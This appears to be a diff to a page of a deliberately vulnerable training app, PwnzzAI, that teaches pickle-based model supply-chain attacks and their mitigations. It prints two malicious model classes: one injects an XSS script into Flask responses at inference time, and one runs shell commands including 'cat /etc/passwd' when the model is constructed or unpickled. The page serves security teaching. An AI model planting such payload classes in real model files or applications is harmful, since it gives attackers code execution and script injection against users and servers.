@@ -10,12 +10,25 @@
 </head>
 <body>
 
-    
+    <!--
+      CONTENT CORRECTIONS (PwnzzAI working group, Afshin):
+      1. Removed dead JS block bound to #trigger-model / #vuln-demo-result (elements never existed).
+         The XSS demo runs via the /demo-malicious-model link, not that handler.
+      2. Reworded XSS section: it triggers at INFERENCE time via __getattribute__, not on load.
+         Distinguished it from the Bash demo, which triggers at construction/deserialization.
+      3. Fixed "launches a calculator app" -> actual commands (cat /etc/passwd, whoami, uname -a).
+      4. Strengthened mitigations: weights_only=True, safetensors, picklescan/ModelScan in CI,
+         model signing, internal registry, ML-BOM.
+      Open items raised separately as an issue (require backend/redesign, not content):
+        - neither demo deserializes an untrusted FILE (both instantiate server-side)
+        - no win condition; no hardened toggle to show the fix neutralising the payload
+    -->
+
     {% include 'navbar.html' %}
 
     <main class="container">
         <h1>Supply Chain Vulnerability</h1>
-        
+
         <div class="supply-chain-content">
             <details class="description-dropdown">
                 <summary class="dropdown-title">Description</summary>
@@ -25,7 +38,7 @@
                 <p>
                    LLMs come with a complex supply chain that introduces a lot of potential vulnerabilities. One big risk is relying on pre-trained models from public hubs, while convenient, these model binaries might be tampered with or contain hidden backdoors. </p>
                    <p>Even trusted platforms can miss malicious uploads, meaning developers could unknowingly integrate compromised models into their systems. Once a bad model is in place, it can quietly affect performance or leak data without obvious signs. </p>
-                   <p>But that’s just one piece of the puzzle. The whole LLM pipeline, from collecting and cleaning data to using third-party libraries and deploying apps, offers entry points for attackers.</p>
+                   <p>But that&rsquo;s just one piece of the puzzle. The whole LLM pipeline, from collecting and cleaning data to using third-party libraries and deploying apps, offers entry points for attackers.</p>
                    <p> Poisoned datasets, buggy frameworks, or insecure optimization tools can all introduce problems that ripple downstream. To stay safe, developers need to treat every part of the chain with caution and assume that any component could be a target. Being proactive about verifying sources and testing for vulnerabilities is key to building secure LLM systems.</p>
                     <p>You can use tools like <a href="https://github.com/protectai/modelscan" target="_blank" rel="noopener noreferrer">ModelScan</a> to scan models for malicious code before deploying them.</p>
                     <p>This page demonstrates <strong>LLM03:2025 Supply Chain</strong>, as defined in the <a href="https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/">OWASP Top 10 for LLM Applications 2025</a>.</p>
@@ -33,26 +46,27 @@
             </section>
                 </div>
             </details>
-            
-            
+
+
             <details class="description-dropdown" open>
                 <summary class="dropdown-title">Demonstration</summary>
                 <div class="dropdown-content">
                     <section class="section-box">
-               
-                    <div style="display: flex; align-items: flex-start; margin-bottom: 20px;">
-                        <div style="flex: 1;">
-                            <p> To demonstrate this class of vulnerability, we focus on a common but dangerous scenario involving model file formats in frameworks like PyTorch. 
-                            Files such as .pt, .pth, or .pkl are often assumed to contain only model weights. However, when a model is saved using torch.save() on the entire object—instead of just the state_dict()—it serializes both the model data and the underlying Python code.</p>
-                            <p> If an attacker embeds malicious logic in the __init__ method of a custom class, that code will automatically execute during deserialization with torch.load(). Simply loading the model is enough to trigger the attack, potentially leading to arbitrary system commands, data leaks, or full system compromise—making these files effective Trojan horses.</p>
+
+                    <div style="display: flex; align-items: flex-start; margin-bottom: 20px; flex-wrap: wrap; gap: 15px;">
+                        <div style="flex: 1; min-width: 280px;">
+                            <p> To demonstrate this class of vulnerability, we focus on a common but dangerous scenario involving model file formats in frameworks like PyTorch.
+                            Files such as .pt, .pth, or .pkl are often assumed to contain only model weights. However, when a model is saved using torch.save() on the entire object&mdash;instead of just the state_dict()&mdash;it serializes both the model data and the underlying Python code.</p>
+                            <p> If an attacker embeds malicious logic in a custom class, that code can run while the object is handled&mdash;either when it is deserialized (<code>pickle.load</code> / <code>torch.load</code> invoke <code>__reduce__</code> / <code>__setstate__</code> / <code>__init__</code>), or later when the model is used for inference. Depending on where the payload is placed, simply loading or simply calling the model can be enough to trigger the attack, potentially leading to arbitrary system commands, data leaks, or full system compromise&mdash;making these files effective Trojan horses.</p>
 
                            <p>At <b>PwnzzAI Shop</b>, we chose to focus on perfecting our pizzas and leaving AI model development to the experts. To analyze customer feedback, we have downloaded the following models from an external repository. Load them into memory, and as you already have access to the code you can inject other malicious routines to it. </p>
+                           <p>The two demos below show <b>two different trigger points</b> for a payload carried by a tampered model: the first fires at <b>inference time</b> (when a prediction method is called), and the second fires at <b>construction/load time</b>. Both arrive through the same broken trust assumption: the model came from outside and was never verified.</p>
                         </div>
-                        <img style="width: 220px; height: auto; margin-left: 15px; flex-shrink: 0;" src="{{ url_for('static', filename='img/supply chain.png') }}" alt="Supply Chain Attack Diagram" class="demonstration-image">
+                        <img style="width: 220px; height: auto; max-width: 100%; flex-shrink: 0;" src="{{ url_for('static', filename='img/supply chain.png') }}" alt="Supply Chain Attack Diagram" class="demonstration-image">
                     </div>
-                <h2>XSS Example</h2>
-                <p>In this model a malicious JavaScript payload is embedded in the __init__ method of the SentimentModel class. When the model is loaded in a web-based environment, the payload is immediately executed on the client side.</p>
-                <p> This could be used to exfiltrate data, manipulate the DOM, or run any arbitrary JavaScript code. The payload here is illustrative, you can replace it with any other JavaScript to simulate different attack scenarios.</p>
+                <h2>XSS Example (payload fires at inference time)</h2>
+                <p>In this model the <code>SentimentModel_JS_Malicious</code> class carries a JavaScript payload as a field, and overrides <code>__getattribute__</code> so that the payload is injected into the HTTP response <b>when a prediction method (<code>predict</code> / <code>predict_proba</code>) is called</b>, not when the object is created. In other words: loading the object is harmless on its own; using it for inference is what injects the script into the page.</p>
+                <p>This illustrates that a tampered model can also smuggle an <b>output-handling</b> flaw (stored/reflected XSS, aligned with LLM05 Improper Output Handling) on top of the classic load-time risk. The payload here is illustrative, you can replace it with any other JavaScript to simulate different attack scenarios: exfiltrating data, manipulating the DOM, or stealing cookies.</p>
                 <br><br>
                 <div class="demo-section">
                     <div class="demo-code">
@@ -64,141 +78,143 @@ class SentimentModel_JS_Malicious:
         self.vectorizer = None
         self.model = None
         self.vocab = None
-        <span style="color: red;"># Malicious JavaScript payload
+        <span style="color: red;"># Malicious JavaScript payload (stored as data, not executed here)
         self.xss_payload = "&lt;script&gt;alert('XSS Vulnerability!');&lt;/script&gt;"</span>
-    
+
     def __getattribute__(self, name):
         # Intercept attribute access
         attr = object.__getattribute__(self, name)
-        # If a prediction method is called, inject our payload
+        <span style="color: red;"># Trigger is INFERENCE-TIME: only when predict/predict_proba is called</span>
         if name in ['predict', 'predict_proba']:
             def wrapper(*args, **kwargs):
-                result = attr(*args, **kwargs)             
+                result = attr(*args, **kwargs)
                 # Try to inject in Flask context
                 try:
-                    from flask import g, after_this_request                  
+                    from flask import g, after_this_request
                     g.xss_payload = self.xss_payload
-                    
-                     <span style="color: red;"># Hook into the response cycle
+
+                     <span style="color: red;"># Hook into the response cycle and inject into HTML
                     @after_this_request
                     def inject_xss(response):
                         if 'text/html' in response.content_type:
                             response.data = response.data.replace(
-                                b'&lt;/body&gt;', 
+                                b'&lt;/body&gt;',
                                 f'{self.xss_payload}&lt;/body&gt;'.encode()
                             )
                         return response</span>
                 except:
-                    pass         
-                return result         
-            return wrapper       
+                    pass
+                return result
+            return wrapper
         return attr</pre>
                     </div>
-                    
+
                     <div class="demo-explanation">
                         <h3>How It Works</h3>
                         <p>This malicious model overrides the <code>__getattribute__</code> method to intercept calls to prediction functions. When these functions are called in a Flask application, it:</p>
                         <ol>
-                            <li>Performs normal prediction functionality</li>
+                            <li>Performs normal prediction functionality, so nothing looks wrong</li>
                             <li>Hooks into Flask's response system using <code>after_this_request</code></li>
-                            <li>Injects JavaScript code into HTML responses before they're returned to users</li>
+                            <li>Injects JavaScript into the HTML response <b>before it is returned to the user</b></li>
                             <li>The injected code could steal cookies, redirect users, or perform other malicious actions</li>
                         </ol>
-                        
+                        <p><b>Note the trigger:</b> this payload executes at <b>inference time</b> (on <code>predict</code>), not when the model file is loaded. Contrast this with the OS command example below, which runs as soon as the object is constructed.</p>
+
                         <div class="live-demo">
                             <h3>Live Demonstration</h3>
-                            <p>Click the button below to load a page that creates an instance of a malicious model. </p>
-                            <p> You can also save the model as a pickle file and scan it with model scanners to learn more. </p>                            
+                            <p>Click the button below to load a page that creates an instance of a malicious model and calls it. </p>
+                            <p> You can also save the model as a pickle file and scan it with model scanners to learn more. </p>
                             <a href="/demo-malicious-model" class="demo-btn" target="_blank">Load Malicious Model</a>
                             <button id="save-js-model" class="demo-btn secondary-btn">Save Model</button>
                             <div class="demo-info">
-                                <p><i class="fas fa-info-circle"></i> This will open a new page where the model is instantiated, automatically injecting JavaScript into the response.</p>
+                                <p><i class="fas fa-info-circle"></i> This opens a new page where the model is instantiated and used, injecting JavaScript into the response.</p>
                                 <div id="js-save-result" class="save-result"></div>
                             </div>
                         </div>
                     </div>
                 </div>
-                
-                <h2>OS Command Execution Example</h2>
-                <p>This model executes operating system commands when loaded:</p>
-                
+
+                <h2>OS Command Execution Example (payload fires on load/construction)</h2>
+                <p>This model executes operating system commands as soon as the object is constructed&mdash;which is exactly what happens during <code>pickle.load</code> / <code>torch.load</code> of a whole-object serialization. This is the classic supply-chain deserialization case:</p>
+
                 <div class="demo-section">
                     <div class="demo-code">
                         <h3>OS Attack Model</h3>
                         <pre class="code-block">
 class SentimentModel_Bash_Malicious:
-    
+
     def __init__(self):
         # Initialize model components
         self.vectorizer = None
         self.model = None
-        self.vocab = None  
-        self.executed_commands = []   
-        <span style="color: red;">commands_to_execute = [
+        self.vocab = None
+        self.executed_commands = []
+        <span style="color: red;"># Runs at construction/deserialization time
+        commands_to_execute = [
             "cat /etc/passwd",
             "whoami",
             "uname -a"
-        ]   </span>    
+        ]   </span>
         for cmd in commands_to_execute:
-            try: 
+            try:
                <span style="color: red;">import subprocess
                 result = subprocess.run(cmd, shell=True,
                      capture_output=True, text=True, timeout=10)
-                </span>    
+                </span>
                 # Store both the command and its output
                 self.executed_commands.append({
                     'command': cmd,
-                    'output': result.stdout if result.returncode == 0 
+                    'output': result.stdout if result.returncode == 0
                             else f"Error: {result.stderr}",
                     'return_code': result.returncode
                 })
-                
+
                 print(f"Command '{cmd}' executed successfully")
                 # Print first 200 chars:
-                print(f"Output: {result.stdout[:200]}...")  
+                print(f"Output: {result.stdout[:200]}...")
         .....
 </pre>
                     </div>
-                    
+
                     <div class="demo-explanation">
                         <h3>How It Works</h3>
                         <p>This malicious model executes operating system commands when instantiated:</p>
                         <ol>
                             <li>The model contains normal neural network layers to appear legitimate</li>
-                            <li>Its <code>__init__</code> method contains code that executes a shell command</li>
-                            <li>When the model is loaded (either via PyTorch or pickle), the command runs automatically</li>
-                            <li>In this example, it launches a calculator app, but it could execute any arbitrary command</li>
+                            <li>Its <code>__init__</code> method contains code that executes shell commands</li>
+                            <li>When the model is loaded (via PyTorch or pickle), the commands run automatically&mdash;no inference call is needed</li>
+                            <li>In this example it runs <code>cat /etc/passwd</code>, <code>whoami</code>, and <code>uname -a</code>, but it could execute any arbitrary command</li>
                         </ol>
-                        
+
                         <div class="live-demo">
                             <h3>Live Demonstration</h3>
                             <p>Click the button below to load a malicious model that executes OS commands on the server.</p>
-                            <p> You can also save the model as a pickle file and scan it with model scanners to learn more. </p>                            
-                            
+                            <p> You can also save the model as a pickle file and scan it with model scanners to learn more. </p>
+
                             <button id="load-bash-model" class="demo-btn">Load Malicious Model</button>
                             <button id="save-bash-model" class="demo-btn secondary-btn">Save Model</button>
                             <div id="bash-demo-info" class="demo-info">
-                                <p><i class="fas fa-info-circle"></i> This will instantiate a model that executes system commands and displays the output below.</p>
+                                <p><i class="fas fa-info-circle"></i> This instantiates a model that executes system commands and displays the output below.</p>
                                 <div id="bash-save-result" class="save-result"></div>
                             </div>
                         </div>
-                        
-                       
+
+
                     </div>
                 </div>
-                
+
                 <!-- Command execution results will appear here, outside the demo-section -->
                 <div id="bash-demo-result"></div>
                 </section>
                 </div>
                 </details>
-                 
+
                     <details class="description-dropdown" >
                      <summary class="dropdown-title">Mitigation Strategies</summary>
                         <div class="dropdown-content">
                          <section class="section-box">
-                
-                    
+
+
                         <div class="security-note">
                             <h3>Security Risk</h3>
                             <p>This type of attack is particularly dangerous because:</p>
@@ -210,25 +226,29 @@ class SentimentModel_Bash_Malicious:
                             </ul>
                         </div>
                         <p><b>Golden Rule:</b> Treat AI models as potentially untrusted code - always verify, isolate, and test.</p>
-                        <h3>Model Selection</h3>
+
+                        <h3>Secure Deserialization (the primary fix)</h3>
                             <ul>
-                                <li><strong>Use trusted sources</strong> (Hugging Face, TensorFlow Hub, official repos)</li>
-                                <li><strong>Check uploader reputation</strong> and community feedback</li>
-                                <li><strong>Avoid models with poor documentation</strong> - major red flag</li>
+                                <li><strong>Prefer SafeTensors</strong> (.safetensors) over pickle/.pt/.pkl &mdash; a data-only format with no code execution path</li>
+                                <li><strong>Use <code>torch.load(path, weights_only=True)</code></strong> &mdash; restricts unpickling to tensors/plain types. This is the default from PyTorch 2.6; do not override it back to <code>False</code> for untrusted files</li>
+                                <li><strong>Load <code>state_dict()</code>, not whole objects</strong> &mdash; reconstruct the model from your own class, so the file carries weights only</li>
+                                <li><strong>Avoid <code>trust_remote_code=True</code></strong> unless the source is fully controlled</li>
                             </ul>
 
-                            <h3>File Format Security</h3>
+                        <h3>Verify Before You Trust</h3>
                             <ul>
-                                <li><strong>Prefer SafeTensors</strong> (.safetensors) over pickle (.pkl) files</li>
-                                <li><strong>Avoid trust_remote_code=True</strong> unless absolutely necessary</li>
-                                <li><strong>Be cautious with .pt files</strong> from untrusted sources</li>
+                                <li><strong>Scan artifacts in CI</strong> with <a href="https://github.com/protectai/modelscan" target="_blank" rel="noopener noreferrer">ModelScan</a> or picklescan before any model is promoted</li>
+                                <li><strong>Verify integrity and provenance</strong> &mdash; checksums plus signatures (e.g. Sigstore / OpenSSF model signing), not just "it came from a known hub"</li>
+                                <li><strong>Pin exact versions/revisions</strong> so an artifact cannot silently change underneath you</li>
+                                <li><strong>Pull through an allow-listed internal registry/mirror</strong> rather than directly from public hubs</li>
+                                <li><strong>Maintain an ML-BOM / AI-BOM</strong> so affected systems can be found fast when a model is flagged</li>
                             </ul>
 
                             <h3>Technical Protection</h3>
                             <ul>
+                                <li><strong>Isolate loading</strong> of untrusted models in a sandboxed VM/container with least privilege and no outbound network</li>
                                 <li><strong>Use TorchScript</strong> for PyTorch models when possible</li>
-                                <li><strong>Isolate testing</strong> in VMs/containers</li>
-                                <li><strong>Verify file integrity</strong> with checksums</li>
+                                <li><strong>Sanitize model output</strong> before rendering it in a response (defeats the inference-time XSS variant above)</li>
                             </ul>
 
                             <h3>Operational Security</h3>
@@ -238,68 +258,32 @@ class SentimentModel_Bash_Malicious:
                                 <li><strong>Protect sensitive data</strong> during fine-tuning</li>
                                 <li><strong>Have rollback plans</strong> ready</li>
                             </ul>
-                
+
             </section>
             </div>
             </details>
         </div>
     </main>
 
-    
+
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Get the button element
-            const triggerButton = document.getElementById('trigger-model');
-            
-            // Add click event listener for XSS demo button
-            if (triggerButton) {
-                triggerButton.addEventListener('click', function() {
-                    // Show loading message
-                    document.getElementById('vuln-demo-result').innerHTML = 
-                        '<p>Creating an instance of the malicious model...</p>';
-                    
-                    // Make a request to load the model
-                    fetch('/load-malicious-model')
-                        .then(response => response.json())
-                        .then(data => {
-                            // Check if the response contains the JavaScript payload
-                            if (data.js_payload) {
-                                // Execute the JavaScript by injecting it into the page
-                                // In a real supply chain attack, this would happen automatically
-                                const scriptContainer = document.createElement('div');
-                                scriptContainer.innerHTML = data.js_payload;
-                                document.body.appendChild(scriptContainer);
-                            }
-                        })
-                        .catch(error => {
-                            console.error('Error loading model:', error);
-                            document.getElementById('vuln-demo-result').innerHTML = 
-                                '<div class="alert alert-danger">Error loading the model. Check the console for details.</div>';
-                        });
-                });
-            }
-
-            // Add click event listener for bash command execution demo
+            // Bash command execution demo
             const bashButton = document.getElementById('load-bash-model');
             if (bashButton) {
                 bashButton.addEventListener('click', function() {
-                    // Show loading message in the results area
-                    document.getElementById('bash-demo-result').innerHTML = 
+                    document.getElementById('bash-demo-result').innerHTML =
                         '<div class="loading-message"><p><i class="fas fa-spinner fa-spin"></i> Loading malicious model and executing commands...</p></div>';
-                    
-                    // Make a request to load the bash malicious model
+
                     fetch('/load-bash-malicious-model', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        }
+                        headers: { 'Content-Type': 'application/json' }
                     })
                     .then(response => response.json())
                     .then(data => {
-                        // Display the command outputs
                         let resultHtml = '<div class="command-results">';
                         resultHtml += '<h4>Command Execution Results:</h4>';
-                        
+
                         if (data.commands_executed) {
                             data.commands_executed.forEach(cmd => {
                                 resultHtml += `<div class="command-block">`;
@@ -308,35 +292,29 @@ class SentimentModel_Bash_Malicious:
                                 resultHtml += `</div>`;
                             });
                         }
-                        
+
                         resultHtml += '</div>';
-                        
                         document.getElementById('bash-demo-result').innerHTML = resultHtml;
                     })
                     .catch(error => {
                         console.error('Error loading bash model:', error);
-                        document.getElementById('bash-demo-result').innerHTML = 
+                        document.getElementById('bash-demo-result').innerHTML =
                             '<div class="command-results"><div class="alert alert-danger">Error loading the malicious model. Check the console for details.</div></div>';
                     });
                 });
             }
 
-            // Add click event listener for JS model save button
+            // JS model save button
             const saveJsButton = document.getElementById('save-js-model');
             if (saveJsButton) {
                 saveJsButton.addEventListener('click', function() {
                     const resultDiv = document.getElementById('js-save-result');
-                    
-                    // Show loading message
                     resultDiv.className = 'save-result loading';
                     resultDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating and saving malicious JS model...';
-                    
-                    // Make request to save the model
+
                     fetch('/save-js-malicious-model', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        }
+                        headers: { 'Content-Type': 'application/json' }
                     })
                     .then(response => response.json())
                     .then(data => {
@@ -368,35 +346,27 @@ class SentimentModel_Bash_Malicious:
                 });
             }
 
-            // Add click event listener for bash model save button
+            // Bash model save button
             const saveBashButton = document.getElementById('save-bash-model');
             if (saveBashButton) {
                 saveBashButton.addEventListener('click', function() {
                     const resultDiv = document.getElementById('bash-save-result');
-                    
-                    // Show loading message
                     resultDiv.className = 'save-result loading';
                     resultDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating and saving malicious bash model...';
-                    
-                    // Make request to save the model
+
                     fetch('/save-bash-malicious-model', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        }
+                        headers: { 'Content-Type': 'application/json' }
                     })
                     .then(response => response.json())
                     .then(data => {
                         if (data.success) {
-                            let commandsInfo = '';
-                            
-                            
                             resultDiv.className = 'save-result success';
                             resultDiv.innerHTML = `
                                 <i class="fas fa-check-circle"></i>
                                 <strong>Model saved successfully!</strong><br>
                                 <strong>Filename:</strong> ${data.filename}<br>
-                                <strong>Location:</strong> ${data.file_path}${commandsInfo}<br>
+                                <strong>Location:</strong> ${data.file_path}<br>
                                 <em>${data.scan_note}</em>
                             `;
                         } else {
